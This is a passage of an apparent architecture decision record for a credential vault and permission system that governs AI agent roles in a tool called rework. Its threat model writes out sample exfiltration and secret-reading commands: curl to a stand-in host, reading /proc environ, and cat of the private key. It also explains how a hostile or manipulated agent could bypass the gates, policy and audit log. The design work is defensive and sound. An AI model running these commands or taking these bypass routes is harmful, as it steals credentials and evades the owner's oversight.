- **Add** (`library.py:403-424` builds the add `Form` of `Field`s, `_add` at `:429`; the
  type field gains `credential`). A credential form adds an `env var` field and a **masked
  `Field(kind="secret")`** (a new kind next to `"area"` in the `Field` dataclass, `tui/widgets/modals.py:84-91`, `kind` at `:88`,
  rendered with `Input(password=True)`). On submit the TUI fetches the active public key,
  checks it against the pinned fingerprint, encrypts locally, and writes the envelope
  through a new `TuiData.credential_add` beside `library_add` (`tui/data.py`). The
  plaintext is not stored in the form values after encryption. The owner sets the policy
  in the same form (below).
- **Rotate.** `r` on a credential opens the masked field only; same encrypt-and-replace.
- **Detail pane.** Name, description, how-to-use, env var, scope summary, key id,
  `rotated_at`, value state (`●●●● stored` / `no value` / `unavailable: …`). Never a
  value, last four characters, or length.
- **Policy editor.** A form over the rule (section 6): approval mode as a select
  (`never`, `first use per mission`, `every use`), effect, and projects / roles / models /
  providers / missions as pick-lists with an explicit "any". It previews the sentence the
  gate will show. The same editor serves skills and tools (evaluated from phase 3) and the command rules
  (editable by CLI from phase 2; this editor for them arrives in phase 3).
- **Usage log.** A tab of `permission_audit` rows for the selected item (time, mission,
  role, redacted command, outcome), live like the other views (`Hub.guard`, ADR 0006).
- **Locked banner.** When the daemon reports a locked vault the Library view shows it.
- **Chat interception.** `tui/views/work.py:465` calls `engine.send(text)`. Before that
  call, the detector (section 5) inspects the text; on a hit the message is **not sent
  and not stored** (`OrchestratorChat.send` records at `orchestrator/chat.py:437`; the user turn
  would otherwise be in `chat_messages`). A modal offers: *Save as credential* (opens the
  masked form with the matched token prefilled and a name/policy to fill), *It's not a
  secret* (sends, with a `chat_intercept` audit row), *Cancel*. The same check guards gate
  answers typed in `tui/views/gates.py`. `OrchestratorChat.send` runs the same check itself
  and returns an error (pointing at `rework credential add`) rather than sending: that
  backstop covers every front-end and ships in phase 1, and the TUI modal above, which
  makes it graceful, is phase 3. Images cannot be scanned (limit).

### 10. Provider API keys are out of scope

Provider keys stay where they are: `api_key_env` in `models.json`
(`kernel/llm/catalog.py:33`, `:60`) and `~/.rework/rework.env`, loaded by `load_env_file`
(`config.py:20-46`) and synced to targets by `rework sync-config`
(`cli/__init__.py:1586-1598`). **This design does not move provider keys into the Library, does
not encrypt them, and does not put them behind the permission system.** Credentials are
what agents use for their tasks; provider keys are what rework uses to run agents. There are two
interactions, both subtractive or defensive. (1) The section 4 allowlist removes provider
keys from the environment of role commands: `load_env_file` copies `rework.env` into
`os.environ` (`config.py:44-45`) and the adapters read the keys from there
(`kernel/llm/adapters/__init__.py:39-45`), but `role_env` no longer passes them on. That
is subtraction only: the keys are still in `models.json`/`rework.env` and the daemon's own
environment, not in the Library, not encrypted, not behind the permission system. The
`rework.env` file itself stays readable to a role (the file channel, section 11).
(2) Provider key values are also loaded into the redactor as redact-only needles
(section 5): belt-and-braces now, since the environment is no longer the way an agent
sees them, but they still stop an agent that read one from a file from persisting it.

### 11. Threat model

The two tables are scoped to what is actually enforced. "Protects against" lists
only what the design mechanically does; everything that depends on an agent *not* going
around the sanctioned path is in the second table, first.

| protects against | how |
|---|---|
| a leaked copy of the database (file, backup, `pg_dump`) | only ciphertext; the private key is not in it |
| a model being *handed* a value through the sanctioned path | no tool returns it; env-only injection into one command; output redacted by value on the daemon host; chat paste intercepted by the detector |
| values in logs, events, artifacts, reports, PR bodies, transcripts that rework's own processes write on the daemon host | redaction at the choke points in section 5 (by value there; shape rules only off-host, section 5) |
| a value reaching the mirrored library repo through `contribute` | credentials skip `write_body`; `contribute` redacts everything else |
| an agent that uses the **sanctioned path** (`run_command credentials=[...]`) outside its scope or without approval | the engine evaluates policy, opens gates and writes audit rows on that path, failing closed. It does not stop an agent that bypasses the path (first row below) |
| a role command reading **its own inherited environment** (`printenv`, `echo $REWORK_ANTHROPIC_KEY`, `$REWORK_DB` with its password, an exported token) | `role_env` is an allowlist and drops everything else (section 4, phase 1; named test `test_role_command_cannot_see_provider_keys_or_db`). It does **not** cover the daemon's *launch* environment, which a role can read from `/proc/<daemon pid>/environ` or `ps eww`, nor any file: both are the first row below |
| an accidental destructive command | the command policy asks (a speed bump, section 8) |
| a *forgotten* sanctioned use | every sanctioned use has an audit row; audit failure denies |
| accidental corruption, or an envelope copied between credential rows | AEAD with the item id in the AAD turns it into `unavailable: corrupt`, never another credential's value. It is **not** a defence against a deliberate DB writer (below) |

| does **not** protect against | why |
|---|---|
| **any role, today, bypassing the whole system by reading the key and the database** | roles run as the daemon's OS user under an advisory jail (`nodes/tools.py:131-134`). The phase-1 allowlist (section 4) closes only the role command's own inherited **environment**; the **file** channel and the daemon's launch environment stay open. A role's shell is a child of the daemon, so `$PPID` is the daemon's pid and `tr '\0' '\n' </proc/$PPID/environ` (or `ps eww -p $PPID`) prints the daemon's launch environment (systemd `Environment=` / `EnvironmentFile=` entries, shell exports such as `REWORK_DB` and provider keys); keys added later by `load_env_file` are generally not in `/proc` environ but are in `rework.env`, below. One `run_command` can `cat ~/.rework/keys/credentials.key`, find the DB (the default sqlite path, `config.py:68-69`, `:91`, or a Postgres URL kept in a file such as `~/.rework/rework.env`) and decrypt every credential: no policy check, no gate, no audit row. The same channel exposes any token a tool keeps on disk under `HOME` (`gh`'s own login, `~/.ssh` keys). The scratch redirects in `role_env` (`:319-323`) hide nothing on disk. **Only a separate OS user or the Docker executor (M7) closes these channels. Until then the permission system governs well-behaved agents and mistakes, not a hostile or manipulated role.** An advisory deny rule on the key path (section 3) is a speed bump only |
| **anyone who can write the database** (the daemon's own DB credentials, a role that finds them, a compromised TUI machine with store access, a `pg_dump` restore into the live DB) | they can insert or edit `permission_policies` (grant themselves allow/`never`), insert `permission_grants`, flip a gate decision (`gates` is just a table; `tui/data.py:302` is a plain `store.decide_gate`), edit or delete `permission_audit` rows (append-only is a property of the store *interface*, not a database constraint), replace the active public key, and, because the public key is public and ECIES has no sender authentication, write a valid envelope of their own value into any credential (so `github-token` can silently become the attacker's token). They cannot read existing values without the private key. The TUI's fingerprint pin catches a public-key swap only on a machine that pinned it; `rotated_at`/`updated_by` make an unexpected rotation *visible* to an owner who looks, not impossible; owner-signed envelopes and DB-level append-only triggers are possible hardening and are not designed here |
| a compromised rewvis host or a root user there | the private key and the decrypted values are in reach |
| an agent exfiltrating a value through a command it is allowed to run (`curl -d "$GH_TOKEN" evil`, `printenv > file`) | the command has the plaintext; `every_use` shows the owner the exact command, and the pre-push scan (phase 2) catches committed files on the two engine push paths only (section 5), but policy cannot read intent |
| the plaintext env var inside the child process | readable via `/proc/<pid>/environ` by the same user, and inherited by descendants and background jobs |
| plaintext in the daemon's memory | resident for the daemon's lifetime in the redactor's needle set and non-zeroable; the exact statement is in section 4 |
| text typed on a host that holds no values | a pasted secret in Mac-side chat is protected only by the detector (section 5); redaction by value cannot exist there |
| backups of the private key | `keys export` output next to a DB backup is full compromise |
| a malicious owner or operator | they set the policy |
| encodings the redactor does not know | section 5 limits |
| a hostile DB writer substituting the public key before a new value is entered | the TUI pins the fingerprint; the first use on a new machine is trust-on-first-use |
| shell-string tricks against the command policy | section 8; script indirection is invisible to it |
| a skill or tool body already served, or read from the DB or git mirror directly | section 6: the scope controls who is *served* a body at `library_read` and MCP `get`, nothing more |
| `role_env.toml` entries | an owner entry makes that variable visible to every role command, by the owner's choice (the daemon warns when it names a known secret, section 4); the file is under `~/.rework`, so a role running as the daemon user could edit it, which is the file channel again |
| the model provider keys, on disk | out of scope (section 10); no longer in a role's environment (section 4), but `rework.env` is a readable file |

### 12. Migration

- **No credential exists until one is created.** Phase 1 creates empty tables
  (`credential_keys`, `credentials`, `permission_policies`, `permission_audit`) and a
  type; there is no key, no row and no policy until `rework keys init` and a first add.
  Phase 2 adds `permission_grants` and seeds the default command rules; phase 3 seeds the
  skill/tool default rules (below). Each phase's tables are created by that phase's own
  `CREATE TABLE IF NOT EXISTS`, so an earlier phase never references a later one.
  `role_env.toml` is an optional file, not a table.
- **The role environment allowlist is a behaviour change, not additive** (phase 1). Order:
  (1) update; (2) run `rework role-env show` (names, never values, of the variables in the CLI's own
  environment and `rework.env` that role commands will no longer see; the daemon's start-up
  log line lists what the daemon itself dropped, section 4); (3) for each one a role legitimately
  needs, either register it as a credential or add it to `role_env.toml` (section 4,
  point f lists what is known to need this). Rollback of the allowlist is reverting the
  code: there is no `inherit_all` setting, on purpose.
- **Both stores, additive.** Everything is `CREATE TABLE IF NOT EXISTS`; no existing
  table gets a column, so the check-then-alter lists (`_MIGRATIONS` at
  `library/store.py:49`, `_SQLITE_MIGRATIONS` at `:60`) are untouched. `gates` is
  unchanged. Library tables are created by `open_library_store` on both substrates
  (`:412-440`); state tables by each store's DDL.
- **A real compatibility hazard, and the order that avoids it.** `_row_to_item` does
  `ItemType(row["type"])` (`library/store.py:82`), which **raises** on a value an old
  binary does not know. A TUI on the Mac that predates this ADR would crash listing a
  Library that contains a credential. Therefore: (1) the first commit of phase 1 makes
  `_row_to_item` skip-and-log unknown types and adds the enum value; (2) it ships and
  every machine updates (`rework update`, including `--target`); (3) only then may the
  owner create a credential. A daemon older than phase 1 never sees the new tables.
- **Existing items** are unchanged: skills/tools/reports/memories, their git files and
  bodies, `tags`, `vectors`, `uses`. Nothing evaluates policy for skills or tools before
  phase 3, so behaviour is unchanged until then. Phase 3 seeds one default rule per type
  (`subject_id='*'`, `effect=allow`, `approval=never`, all five scope keys `"*"`) in the
  same change that starts evaluating them, so current behaviour is preserved.
- **Default command rules** are seeded in phase 2 (the phase that evaluates command
  policy) once with `source='default'`; re-running the seed inserts only missing ids.
- **Rollback.** Dropping the new tables restores today's Library and policy behaviour;
  credential items without their tables become `unavailable`, never an error in listings.
  The environment allowlist is code, not a table, and is not undone by dropping tables.

### 13. Phased implementation plan

**Phase 1: the role-environment allowlist, storage, encryption, injection, redaction, audit,
and a minimal owner-written allow/deny policy.** Self-contained: it depends on nothing from
phase 2 or 3. Lands: **the role-environment allowlist (section 4: `role_env` rebuilt from
the baseline plus `~/.rework/role_env.toml`, `rework role-env show|allow`)**, which needs
neither a key nor a credential; `ItemType.CREDENTIAL` and tolerant `_row_to_item`. The
allowlist and the tolerant-`_row_to_item` commit (section 12) are independent: either may
land first, neither needs the other, and no credential is created until both have shipped; `credential_keys`, `credentials`,
`permission_policies` and `permission_audit` in both stores; `rework keys
init|export|import|fingerprint`; the envelope and `CredentialVault`; `rework credential
add|rotate|retire|list` for the CLI; the `Redactor`, the secret detector with its
`OrchestratorChat.send` backstop (an error, no modal), and every hook in section 5 except
the TUI render hook (phase 3); `PermissionExecutor` (outermost, section 4) evaluating
**steps 1-3 of section 6 and approval `never` only**; the `credentials` argument on
`run_command` and the per-call `ContextVar` that carries the value to the spawn site; the
audit writes; `cryptography` as a direct dependency. **Where phase 1's rule comes from:** the owner writes it, with `rework
credential add NAME --env GH_TOKEN --allow --roles coder --projects p-ab12 --models any
--providers any --missions any` (value read by masked `getpass`; all five scope dimensions
must be given or explicitly `any`) and `rework permissions allow|deny|list [--malformed]|retire|log`
(`retire` and `list --malformed` are here so that a malformed phase 1 rule, section 6, can be
repaired without waiting for phase 2). Both write `permission_policies` rows with `effect`
allow/deny and `approval=never`. A rule with `ask` or another approval mode is stored but
evaluated as **deny** ("approval modes arrive in phase 2"), so phase 1 never allows more
than the owner wrote. There are no gates, grants, command rules, agent proposals
(`credential_propose`), skill/tool evaluation or pre-push scan in this phase.

Tests (SQLite and Postgres via the store conformance suite):
- `test_envelope_roundtrip`; `test_wrong_private_key_fails_closed`;
  `test_missing_private_key_marks_unavailable_and_does_not_run`;
  `test_tampered_ciphertext_rejected`; `test_envelope_bound_to_item_id` (a copied envelope
  fails authentication); `test_unknown_envelope_version_unavailable`.
- `test_db_copy_without_key_leaks_nothing`: dump every table and the library git repo of
  a populated instance and grep for the value and its encodings: zero hits.
- `test_credential_never_in_search_read_item_mcp_get` and
  `test_credential_never_written_to_git` (`write_body` not called, `body_path` NULL).
- `test_row_to_item_skips_unknown_type`.
- Policy (phase 1 subset): `test_default_deny_without_rule`, `test_explicit_deny_beats_allow`,
  `test_missing_scope_key_rejected_on_save`, `test_malformed_allow_rule_non_matching`,
  `test_malformed_deny_rule_matches_everything` (fails closed toward deny),
  `test_wildcard_sentinel_matches_any_item_and_null_is_malformed`,
  `test_non_never_approval_denied_in_phase1`, `test_policy_db_error_denies`,
  `test_permissions_retire_repairs_malformed_rule`,
  `test_pinned_fingerprint_mismatch_refuses_encrypt`.
- Redaction: `test_redact_exact`, `_base64_all_alignments`, `_hex`, `_url_encoded`,
  `_json_escaped`, `_partial_head_tail`, `_short_value_exact_only`,
  `_binary_output_bytes_pass`, `_redacts_before_truncation` (value straddling the 4000
  char cut), `_timeout_partial_output`.
- Redaction targets (each asserts the value and its encodings are absent, and that the
  `[REDACTED:name]` marker is present): `test_run_artifact_redacted_on_update_run` (a
  nested artifact dict/list containing the value, stored via `RedactingStore` on both
  backends); `test_report_render_md_redacted` (`_render_md`, `cli/__init__.py:582`, given
  artifacts that bypass the store, plus the Library report written by `contribute`: index
  body and git file); `test_pr_title_and_body_redacted` (a fake `gh` binary records argv;
  `_create_pr` with the value in objective/summary: recorded `--title`/`--body` clean);
  `test_chat_transcript_redacted` (fake provider echoes the value; stored `chat_messages`
  content and display are clean); `test_events_redacted_before_append` (nested payload
  published on the bus: the `events` row and what subscribers receive are clean);
  `test_json_and_console_log_formatters_redact` (message and exception text, valid JSON
  line); `test_save_loop_transcript_redacted` (the on-disk loop file).
- **Role environment (owner requirement; both are named, mandatory, and block the phase):**
  - `test_role_command_cannot_see_provider_keys_or_db`: through the real
    `PermissionExecutor` over a real `LocalExecutor` (a repo with a `pyproject.toml` and a
    plain repo, because they take different branches in `role_env`), set
    `REWORK_ANTHROPIC_KEY`, `REWORK_FIREWORKS_KEY`, `ANTHROPIC_API_KEY` and `OPENAI_API_KEY`
    (the defaults the provider adapters read when an entry names no `api_key_env`,
    `kernel/llm/adapters/__init__.py:39-42`), `REWORK_DB=postgresql://u:pw@h/db`,
    `REWORK_TOKEN`, `GH_TOKEN` and an arbitrary `FOO_SECRET` in the daemon's environment;
    the role's `run_command` of `printenv` returns none of those names and none of those
    values, and still returns `PATH` and `HOME` (the test is not vacuous: the command ran).
    It asserts on the **names** as well as the values and runs without the `Redactor`
    installed: the redactor holds the provider keys as needles (section 5) and would mask a
    leaked value, hiding exactly the failure this test exists to catch.
    Negative control, per the repo's practice: temporarily restore `env =
    dict(os.environ)` in `role_env` and confirm the test goes red.
  - `test_injected_credential_visible_only_in_the_granted_call`: call 1,
    `run_command("[ -n \"$GH_TOKEN\" ] && echo present || echo absent",
    credentials=["github-token"])` returns `present`; call 2, the same command in the
    same role without `credentials`, returns `absent`; and call 1 with `printenv GH_TOKEN`
    returns the `[REDACTED:github-token]` marker, never the value. (It replaces the
    earlier `test_env_var_only_for_target_command`.)
  - Allowlist unit tests: `test_role_env_baseline_names_pass_everything_else_dropped`;
    `test_role_env_has_no_fallthrough_when_the_owner_file_is_missing_or_invalid` (missing,
    unreadable, bad TOML, bare `*`, short prefix: baseline only, never the parent
    environment); `test_role_env_owner_list_exact_and_prefix_entries`;
    `test_role_env_allowlist_applies_to_a_repo_without_pyproject` (the early-return
    branch); `test_role_env_scratch_redirects_are_set_not_inherited` (a daemon that
    exported `REWORK_LOG_DIR` does not leak it); `test_credential_env_name_on_the_allowlist_refused`
    and `..._unavailable_when_allowlist_edited_later`;
    `test_a_plain_repo_keeps_the_daemons_tools` rewritten to assert the tools come through
    `PATH`, not `VIRTUAL_ENV`.
  - `test_chat_send_refuses_pasted_secret` (fake provider: zero calls, no `chat_messages`
    row).
- Injection: `test_env_var_absent_from_transcript_events_logs_chat`,
  `test_value_not_in_command_registry_file`, `test_reserved_env_name_refused`,
  `test_audit_rows_started_finished`, `test_audit_write_failure_denies`,
  `test_plaintext_dropped_after_call` (the wrapper's local and the `ContextVar` hold no
  reference after return, on the success, timeout and exception paths).
- `test_no_secret_in_any_choke_point`: run a mission fixture whose command prints the
  value and assert it is absent from `events`, `runs.artifact`, `chat_messages`, log
  files, `_save_loop` output, and the rendered report.

Exit: all of the above green on both backends, plus a live run on rewvis with phase 1
only, **reconciled with the allowlist** (an exported `GH_TOKEN` stops reaching role
commands, so "a coder's `gh` call works" cannot be the starting assumption). In order:
(1) before updating, the owner notes whether a role's `gh pr list` works today and how
`gh` is authenticated (`gh auth status` says whether the token comes from `GH_TOKEN` in
the environment or from gh's own config under `HOME`); (2) after updating, a role's
`printenv` shows no `REWORK_*_KEY` and no `REWORK_DB`, `rework role-env show`, run in the environment the daemon was started from (or the daemon's
start-up log line), lists `GH_TOKEN` among the dropped names if it was exported, and a role's `gh pr list` *without*
credentials now fails if the token came only from `GH_TOKEN` (that failure is the expected
result and the owner's confirmation that the inherited-environment channel is closed, not the file channel or `/proc/<daemon pid>/environ`); (3) first, on **every machine** (the daemon host, the Mac, any `--target`), `rework update`
has shipped the tolerant `_row_to_item` and `rework keys init` has been run on the daemon
host (section 12: no credential is created until both are done); then the owner adds the
token with the CLI command above, a coder's `gh pr list` succeeds with
`credentials=['github-token']`, and the very next call without it fails again; (4) if `gh`
is logged in through its own config file instead, step 3 would prove nothing (HOME is
allowlisted, so it works with no credential and no audit row: the file channel), so the
check is repeated with `GH_CONFIG_DIR=$(mktemp -d)` prefixed to the command, which hides
the file login and leaves the injected token as the only credential; (5) the owner confirms
the token appears nowhere.

**Phase 2: approval modes, gates, destructive commands, agent proposals, push scan.**
Lands: `permission_grants`; steps 4-5 and the combining rule of section 6 (`ask`,
`first_use_per_mission`, `every_use`); the gate path with `spec` payload, `call_key`
replay safety, timeout and the `actor` tripwire; `credential_propose` (agent proposes name,
description and policy; owner confirms through the gate on the existing Allow / Deny
screen; owner then enters the value with `rework credential rotate NAME`, the masked TUI
field being phase 3); the CLI `rework permissions edit|reset-defaults [--repair]`, and the
way the owner first creates an `every_use` (or `first_use_per_mission`) rule: an
`--approval never|first_use_per_mission|every_use` option on `rework credential add` and
`rework permissions allow` (phase 1 accepts only `never`), or, for a rule that already
exists, `rework permissions edit RULE_ID --approval every_use`; and
`list --commands` (`retire` and `list --malformed` already exist from phase 1);
the command policy with parsing, defaults seeding, ambiguity rule, editing via CLI; the
pre-push scan on both engine push paths.

Tests: `test_strictest_approval_wins`,
`test_first_use_per_mission_asks_once_then_allows_in_same_mission_only`,
`test_every_use_asks_each_time`, `test_unmatched_command_is_allowed` (a plain `ls` opens
no gate: the command policy is a denylist), `test_command_allow_rule_rejected`,
`test_gate_timeout_denies_and_runs_nothing`,
`test_gate_replay_reuses_unconsumed_gate_by_call_key` (restart mid-wait: no second gate;
a consumed gate is not reused for the next identical command),
`test_gate_manager_refuses_agent_actor_on_permission_gate`,
`test_orchestrator_toolset_has_no_gate_deciding_tool`,
`test_permission_gate_spec_shape_both_stores`, `test_agent_proposed_credential_needs_gate`,
`test_proposed_policy_row_never_evaluated_until_active`.
Fail-closed command policy (section 6, step 5): `test_malformed_command_ask_rule_still_asks`
(the seeded `git push --force` rule with a corrupt matcher: an unrelated `ls` opens a
gate naming the malformed rule, and nothing runs before the decision),
`test_malformed_command_deny_rule_denies`,
`test_command_rule_with_bad_status_is_a_hit_not_skipped` (the seeded `git push --force`
`ask` rule edited to `status='Active'`, then to a typo such as `'activ'`: each time
`git push --force` opens a gate naming the malformed rule, and an unrelated `ls` is not
silently allowed past it; an `status='retired'` rule still never matches),
`test_command_rule_read_error_denies_even_a_plain_ls` (a store that raises on the command
rule query: `denied: command policy unreadable`, no process spawned, no cached rules
used), `test_empty_command_rules_after_successful_read_allows` (the contrast),
`test_malformed_command_rule_with_unreadable_effect_denies`,
`test_reset_defaults_repair_replaces_malformed_default_row`.
Denial is not sticky (section 7): `test_denied_gate_does_not_stick_retry_asks_again`,
`test_timed_out_gate_retry_asks_again`,
`test_decided_deny_without_terminal_row_is_reused_on_replay` (crash between decision and
audit row: the denial is honoured, no second gate), `test_deny_note_returned_to_model`.
Command policy: `test_git_push_force_asks`, `_push_to_main_asks`, `_reset_hard_pushed_asks`,
`_delete_remote_branch_asks`, `_rm_rf_outside_workdir_asks`, `_rm_rf_inside_workdir_passes`,
`_delete_without_where_asks`, `_delete_with_where_passes`, `_kubectl_terraform_docker_
systemctl_asks`, `_rework_update_target_asks`, `_ssh_unlisted_host_asks`,
`_ambiguous_variable_command_asks`, `_unparseable_string_asks`, `_alias_resolved`,
`_nested_bash_c_parsed`, `_editing_defaults_takes_effect`, and the `xfail` evasion corpus.
Push scan: `test_push_scan_covers_deliver_branch_and_create_pr` (both engine paths call
`_push_checked`; a value in a committed file blocks each), `test_push_scan_hit_opens_gate_deny_blocks_allow_audits_override`,
`test_push_scan_not_applied_to_agent_git_push` (documented limit, `xfail`),
`test_pr_body_with_value_blocked_and_redacted`.

Exit: the full matrix above green; a dogfood mission where a coder attempts a force-push
and a credentialed `every_use` command, and each stops at a gate that the owner decides.

**Phase 3: skills and tools policies, TUI.** Lands: skills and tools evaluated by the same
engine at the two body-serving points of section 6 (`library_read` through
`PermissionExecutor`, MCP `get` through the policy callback); the default skill/tool
rules; the activation gate for tools (`library/curation.py:3-7`) becomes a policy row
rather than a special case; the TUI work of section 9 (masked field, rotate, policy editor,
usage log, locked banner, the chat-interception modal on top of the phase-1 backstop, and
the TUI render-time redaction hook).

Tests: `test_skill_scope_denies_other_role_at_use_not_at_search` (skill scoped to
`auditor`: as `coder`, `library_search` still lists it, `library_read` returns `denied:`,
`record_use` is not called, a `denied` audit row exists; as `auditor` the body is
returned); `test_tool_body_read_gated_like_skill`;
`test_permission_executor_outside_library_executor` (a deny-all stub: the inner library
handle is never called for `library_read`);
`test_mcp_get_applies_policy_search_unfiltered` (role-scoped rule denies MCP `get`, `ask`
denies with the in-mission message, unreadable policy store denies, `search` unchanged);
`test_tool_activation_equivalent_to_policy`; `test_tui_host_redactor_shape_rules_only` (no
values: shape-matching secret redacted, a random bare password is not, pinned as known
behaviour); existing curation tests unchanged; TUI Pilot tests (`tests/tui/`)
`test_masked_field_not_echoed`, `test_add_credential_writes_only_ciphertext`,
`test_tui_cannot_decrypt` (no private key path is read), `test_rotate_replaces_envelope`,
`test_policy_editor_roundtrip` (five scope keys and the `*` sentinel round-trip),
`test_usage_log_lists_audit_rows`, `test_chat_paste_intercepted_before_model` (fake
provider asserts zero calls and no `chat_messages` row), `test_chat_override_logged`,
`test_public_key_change_prompts`.

Exit: ruff, ruff format, mypy (kernel is strict), the full suite on SQLite and on
Postgres (`REWORK_TEST_POSTGRES`), ADR status moved to Accepted with amendments.

## Alternatives considered

- **libsodium sealed boxes (PyNaCl).** Simple API, widely reviewed. Rejected as the
  default: a new native dependency, no AAD to bind the envelope to the item, no algorithm
  id. A fine swap if the owner prefers it; the envelope's alg byte leaves room.
- **Symmetric encryption with a key on the daemon.** Rejected by the owner's decision: the
  Mac's TUI could not add a value without holding the decryption key.
- **Encrypting the private key with a passphrase at rest.** Safer on disk, but the daemon
  must start unattended under systemd; a passphrase in an env file would be the same
  secret in the same place. Left to the owner as an export-only wrapper (`keys export`).
- **Cloud KMS or Vault.** Stronger, and a new service for a one-owner system. Not now.
- **Policy on `gates` columns.** Rejected for `spec` (section 7).
- **Scrub only the provider keys, or drop variables whose names look secret (`*_KEY`,
  `*TOKEN*`), from an inherited environment.** Rejected (owner, second audit round). A
  denylist or a looks-like-a-secret heuristic fails open on every name it did not
  anticipate (`GH_TOKEN`, a cloud key, a password inside a URL such as `REWORK_DB`), and
  it is no smaller a change than building the environment from an allowlist, which fails
  closed. An earlier draft recorded the inheritance as a known gap and parked scrubbing
  here; section 4 supersedes that.
- **An `inherit_all` switch (or a parent-environment fallback when `role_env.toml` is
  broken) for owners whose commands break.** Rejected: a fail-open knob that a hand edit
  or a parse error can turn on. The owner's list can only add names one at a time.
- **Moving provider keys into the Library so they are injected like credentials.**
  Rejected: settled decision 6. The allowlist only removes them from role environments.
- **Make a denied or timed-out gate sticky for the rest of the run** (do not count it in
  `k`). Rejected in section 7: it turns an owner's absence into a permanent refusal; the
  standing no is a `deny` rule.
- **Deny-by-default for every unparseable command instead of ask.** Safer on paper, but
  unusable (legitimate `python -c` is common); asking matches the owner's rule.
- **Entropy-based redaction of outputs.** Rejected: destroys SHAs and hashes.

## Consequences

- Agents can do real credentialed work and the owner has an audit trail of every
  sanctioned use.
- A model is never handed a value, and a DB copy leaks nothing without the host key. Until
  M7 or a separate OS user, a role can still read the key and the DB and bypass the
  system (section 11); the permission system governs well-behaved agents and mistakes.
- The owner runs two new operational duties: `rework keys init` and keeping the key
  export away from DB backups. Losing the private key makes every credential
  `unavailable` until values are re-entered; that is the price of a DB copy being safe.
- Gates add latency to credentialed and destructive commands; `first_use_per_mission`
  exists to bound that.
- The command policy will have false negatives (scripts, split commands) and false
  positives (noise); both are documented, and ambiguity asks.
- `cryptography` becomes a direct dependency and the `Redactor` is on the hot path of
  every tool result; matching is one compiled regex pass, linear in output size.
- A credential type in the enum is a compatibility event for old binaries; the phase-1
  ordering in section 12 exists for it.
- Role commands no longer inherit the daemon's environment. This is a breaking change for
  anything that relied on an inherited variable (an exported `GH_TOKEN`, proxy variables,
  `SSH_AUTH_SOCK`, `REWORK_TEST_POSTGRES`, the `rework` CLI's `REWORK_DB`/`REWORK_TOKEN`);
  the owner moves each into a credential or `role_env.toml` (section 4, point f). In
  exchange a role command's own inherited environment is empty of secrets by construction,
  not by redaction.
- That does not close the file channel, nor the daemon's launch environment, which a role
  can still read through `/proc/<daemon pid>/environ` or `ps eww` (section 4 point d,
  section 11). Only a separate OS user or the Docker executor closes them.
- A denied or timed-out permission gate asks again on a retry; the owner's standing no is
  a `deny` rule.
- The advisory jail is still advisory. Real isolation remains the Docker executor (M7).
